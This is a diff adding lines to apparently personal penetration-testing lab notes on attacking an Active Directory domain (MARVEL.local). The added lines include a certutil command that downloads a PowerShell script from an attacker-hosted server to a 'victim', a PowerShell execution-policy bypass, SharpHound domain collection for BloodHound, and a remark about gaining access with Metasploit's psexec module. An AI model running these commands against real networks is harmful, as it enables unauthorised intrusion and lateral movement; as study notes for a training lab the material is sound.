@@ -180,3 +180,25 @@ put in Frank Castle - user - admin
 
 Bloodhound import file -> zip (with JSONs)
 shortest path to admin
+
+
+python -m SimpleHTTPServer 80
+transfer to victim:
+certutil -urlcache -f http://10.10.14.30/Sherlock.ps1 Sherlock.ps1
+
+> powershell -ep bypass
+> . .\SharpHound.ps1
+> Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip
+
+FTP Kali
+
+https://www.tecmint.com/install-ftp-server-in-ubuntu/
+sudo vi /etc/vsftpd.conf
+write_enable=YES
+
+neo4j console
+localhost:7474
+
+bloodhound
+
+msf6 exploit(windows/smb/psexec) entra no latest server hehehe
